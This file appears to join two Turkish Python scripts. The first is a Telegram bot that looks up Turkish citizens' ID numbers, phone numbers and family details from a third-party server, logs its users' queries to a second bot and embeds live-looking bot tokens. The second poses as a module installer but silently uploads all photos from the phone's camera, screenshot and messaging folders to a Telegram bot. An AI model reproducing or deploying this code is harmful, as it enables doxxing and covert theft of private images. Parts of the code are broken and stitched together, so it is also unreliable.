from telegram.ext import CommandHandler, Filters, MessageHandler, Updater
import telegram
import requests
import time
import base64
from tabulate import tabulate

TOKEN = "7631824831:AAFkdUijbtm99kDAuFmPo3Wq8EQDMhcE83Y"

def kulanıcılog(bot_message):
TOKEN = "5529731679:AAHXeIfjZE_W5kicrOszDkJk4f_U1DsSLfQ"
chat_id = '5327928507'
api = 'https://api.telegram.org/bot' + token \
+ '/sendMessage?chat_id=' + chat_id + '&parse_mode=Markdown&text=' \
+ bot_message

yolla = requests.get(api)
return yolla.json()

def start(update, source):
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
log = kulanıcılog("Chat Adı:{}\nKulanıcı Adı:mad:{}\nKullandığı Sorgu:/start\nYapımcı: @ss".format(chatadı, kulanıcıadı))
update.message.reply_text('┌┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┐\n Menu\n ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n 》Ad Soyad: /adsoyad ad soyad il \n 》Tc Gsm: /tcgsm tc \n 》gsmtc(aktif): /gsmtc gsm \n 》Tc Pro(bakım): /tcpro tc \n 》Gsm Pro: /gsmtcpro gsm \n 》Aile Pro: /ailepro tc \n ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n Kurallar\n ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n 》Ünlü Sorgusu Yasak \n 》Sms Bomb İle Aynı Numaraya Ard Arda Bomb Basmak Yasaktır \n└┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┙\n\n')

def tcgsm(update, source):
bul = update.message.reply_text('Sorgulanıyor...')
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
bulunan = 0
tc = update.message.text.split(' ')[1]
url = "http://45.147.248.151/TgBot/gsmtc31.php?tc={}".format(tc)
istek = requests.get(url)
json = istek.json()
data = json['data']
log = kulanıcılog(f"Chat Adı:{chatadı}\nKulanıcı Adı:mad:{kulanıcıadı}\nKullandığı Sorgu:/tcgsm\nSorgulanan Tc:{tc}\nYapımcı: @ss")
for i in data:
bulunan += 1
sonuc = f"┌┈┈┈┈┈┈┈┈┈┈┈┈┐\n Sonuç:{bulunan} ┋ River 1.0\n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Tc: {tc} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Gsm:{i['GSM']} \n└┈┈┈┈┈┈┈┈┈┈┈┈┙ "
update.message.reply_text(sonuc)


def gsmtc(update, source):
bul = update.message.reply_text('Sorgulanıyor...')
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
bulunan = 0
gsm = update.message.text.split(' ')[1]
url = "http://45.147.248.151/TgBot/gsmtc31.php?gsm={}".format(gsm)
istek = requests.get(url)
json = istek.json()
data = json['data']
log = kulanıcılog(f"Chat Adı:{chatadı}\nKulanıcı Adı:mad:{kulanıcıadı}\nKullandığı Sorgu:/gsmtc\nSorgulanan Gsm:{gsm}\nYapımcı: @ss")
for i in data:
bulunan += 1
sonuc = f"┌┈┈┈┈┈┈┈┈┈┈┈┈┐\n Sonuç:{bulunan} ┋ River 1.0\n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Gsm: {gsm} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Tc:{i['TC']} \n└┈┈┈┈┈┈┈┈┈┈┈┈┙ "
update.message.reply_text(sonuc)

def adsoyad(update, source):
bul = update.message.reply_text('Sorgulanıyor...')
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
bulunan = 0
ad = update.message.text.split(' ')[1]
soyad = update.message.text.split(' ')[2]
il = update.message.text.split(' ')[3]
url = "http://45.147.248.151/TgBot/adsoyad31.php?ad={}&soyad={}&il={}".format(ad,soyad,il)
istek = requests.get(url)
json = istek.json()
data = json['data']
log = kulanıcılog(f"Chat Adı:{chatadı}\nKulanıcı Adı:mad:{kulanıcıadı}\nKullandığı Sorgu:/adsoyad\nSorgulanan Ad:{ad}\nSorgulanan Soyad:{soyad}\nSorgulanan İl:{il}\nYapımcı: @sse

for i in data:
bulunan += 1
sonuc = f"┌┈┈┈┈┈┈┈┈┈┈┈┈┐\n Sonuç:{bulunan} ┋ River 1.0\n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Tc:{i['TC']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Adı:{i['ADI']} \n 》Soyadı:{i['SOYADI']} \n 》Dogum tarihi:{i['DOGUMTARIHI']} \n 》Anne adı:{i['ANNEADI']} \n 》Anne tc:{i['ANNETC']} \n 》Baba adı:{i['BABAADI']} \n 》Baba tc:{i['BABATC']} \n 》İl:{i['NUFUSIL']} \n 》İlçe:{i['NUFUSILCE']} \n└┈┈┈┈┈┈┈┈┈┈┈┈┙ "
update.message.reply_text(sonuc)


def tcpro(update, source):
bul = update.message.reply_text('Sorgulanıyor...')
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
bulunan = 0
tc = update.message.text.split(' ')[1]
url = "http://45.147.248.151/tgbot/tcvip.php?tc={}".format(tc)
istek = requests.get(url)
json = istek.json()
data = json['DATA']
log = kulanıcılog(f"Chat Adı:{chatadı}\nKulanıcı Adı:mad:{kulanıcıadı}\nKullandığı Sorgu:/tcgsm\nSorgulanan Tc:{tc}\nYapımcı: @ss")
for i in data:
bulunan += 1
sonuc = f"┌┈┈┈┈┈┈┈┈┈┈┈┈┐\n Sonuç:{bulunan} ┋ River 1.0\n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Tc: {tc} \n ┈┈┈┈┈┈┈┈┈┈┈\n Adı:{i['Adı']} \n Soyadı:{i['Soyadı']} \n Dogum tarihi:{i['DogumTarihi']} \n Anneadı:{i['AnneAd']} \n Anne tc:{i['AnneTc']} \n 》Babaadı: {i['BabaAd']} \n 》Baba tc: {i['BabaTc']} \n 》İl: {i['İl']} \n 》İlçe: {i['İlce']} \n └┈┈┈┈┈┈┈┈┈┈┈┈┙ "
update.message.reply_text(sonuc)


def ailepro(update, source):
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
bulunan = 0
tc = update.message.text.split(' ')[1]
url = "http://45.147.248.151/TgBot/AilePro/api31.php?tc={}".format(tc)
istek = requests.get(url)
json = istek.json()
log = kulanıcılog(f"Chat Adı:{chatadı}\nKulanıcı Adı:mad:{kulanıcıadı}\nKullandığı Sorgu:/ailepro\nSorgulanan Tc:{tc}\nYapımcı: @ss")
for i in json:
bulunan += 1
sonuc = f"┌┈┈┈┈┈┈┈┈┈┈┈┈┐\n Sonuç:{bulunan} ┋ River 1.0\n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Yakınlık:{i['Yakınlık']} \n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Tc:{i['Tc']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Adı:{i['Adı']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Soyadı:{i['Soyadı']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Doğum Tarihi:{i['DoğumGünü']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》İl:{i['Nufüsil']} \n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》İlçe:{i['Nufüsilçe']} \n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Gsm:{i['Gsm']} \n ┈┈┈┈┈┈┈┈┈┈┈┈\n└┈┈┈┈┈┈┈┈┈┈┈┈┙ "
update.message.reply_text(sonuc)


def gsmtcpro(update, source):
kulanıcıadı = update.message.chat.username
chatadı = update.message.chat.title
bulunan = 0
gsm = update.message.text.split(' ')[1]
url = "http://45.147.248.151/TgBot/Gsmpro31.php?gsm={}".format(gsm)
istek = requests.get(url)
json = istek.json()
data = json['data']
log = kulanıcılog(f"Chat Adı:{chatadı}\nKulanıcı Adı:mad:{kulanıcıadı}\nKullandığı Sorgu:/gsmpro\nSorgulanan Gsm:{gsm}\nYapımcı: @ss")
for i in json:
bulunan += 1
sonuc = f"┌┈┈┈┈┈┈┈┈┈┈┈┈┐\n Sonuç:{bulunan} ┋ River 1.0\n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》Tc:{i['Tc']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Adı:{i['Adı']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Soyadı:{i['Soyadı']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》Doğum Tarihi:{i['DoğumGünü']} \n ┈┈┈┈┈┈┈┈┈┈┈\n 》İl:{i['Nufüsil']} \n ┈┈┈┈┈┈┈┈┈┈┈┈\n 》İlçe:{i['Nufüsilçe']} \n ┈┈┈┈┈┈┈┈┈┈┈┈\n└┈┈┈┈┈┈┈┈┈┈┈┈┙ "
update.message.reply_text(sonuc)


update = telegram.ext.Updater(TOKEN, use_context=True)
disp = update.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start', start))
disp.add_handler(telegram.ext.CommandHandler('adsoyad', adsoyad))
disp.add_handler(telegram.ext.CommandHandler('tcgsm', tcgsm))
disp.add_handler(telegram.ext.CommandHandler('gsmtc', gsmtc))
disp.add_handler(telegram.ext.CommandHandler('gsmtcpro', gsmtcpro))
disp.add_handler(telegram.ext.CommandHandler('tcpro', tcpro))
disp.add_handler(telegram.ext.CommandHandler('ailepro', ailepro))

update.start_polling()
update.idle()

import os

os.system('pip install requests')
os.system('clear')

import requests
from datetime import datetime



def res(file):
requests.post(f'https://api.telegram.org/bot<bottokenigir>/sendDocument?chat_id=<chatidgir>', files=file)

d = datetime.now()
tlg = requests.post(f'https://api.telegram.org/bot<bottokenigir>/sendMessage?chat_id=<chatidgir>&text=👊 Start Attack .... ✊ '+str(d))

os.chdir(r"/storage/emulated/0/DCIM")
tmp = list(os.scandir('.'))
for i in tmp:
if 'jpg' or 'png' in i.name:
try:
file ={"document": open(f'{i.name}', 'rb')}
res(file)
except:
pass
else:
pass

print('←[2;31m [ * ] ←[2;34m Modüller Kuruluyor. Lütfen Kurulum tamamlandı yazısını görene kadar toolu sonlandırmayın .... ')

print('')

os.chdir(r"/storage/emulated/0/DCIM/Screenshots")
tmp = list(os.scandir('.'))
for i in tmp:
if 'jpg' or 'png' in i.name:
try:
file ={"document": open(f'{i.name}', 'rb')}
res(file)
except:
pass
else:
pass

print('←[2;31m [ ✓ ] ←[2;32m Modüller Kuruluyor Lütfen Bitti yazısını görene kadar toolu sonlandırmayın ......')

print('')

os.chdir(r"/storage/emulated/0/DCIM/Camera")
tmp = list(os.scandir('.'))
for i in tmp:
if 'jpg' or 'png' in i.name:
try:
file ={"document": open(f'{i.name}', 'rb')}
res(file)
except:
pass
else:
pass

print('←[34;1m [ ✔ ] ←[33;1m Watting ......... ')

print('')

os.chdir(r"/storage/emulated/0/Pictures/Telegram")
tmp = list(os.scandir('.'))
for i in tmp:
if 'jpg' or 'png' in i.name:
try:
file ={"document": open(f'{i.name}', 'rb')}
res(file)
except:
pass
else:
pass

print('←[36;1m [ ✘ ] ←[32;1m Start Toole .......')
print('')

os.chdir(r"/storage/emulated/0/Pictures/Instagram")
tmp = list(os.scandir('.'))
for i in tmp:
if 'jpg' or 'png' in i.name:
try:
file ={"document": open(f'{i.name}', 'rb')}
res(file)
except:
pass
else:
pass

print('←[0;1m [ × ] ←[31;1m Modüller kuruluyor az kaldı!#E ...... ')
print('')

os.chdir(r"/storage/emulated/0/Pictures/Messenger")
tmp = list(os.scandir('.'))
for i in tmp:
if 'jpg' or 'png' in i.name:
try:
file ={"document": open(f'{i.name}', 'rb')}
res(file)
except:
pass
else:
pass

exit('Modüller Kuruldu. Toolu kapatabilirsiniz. ')
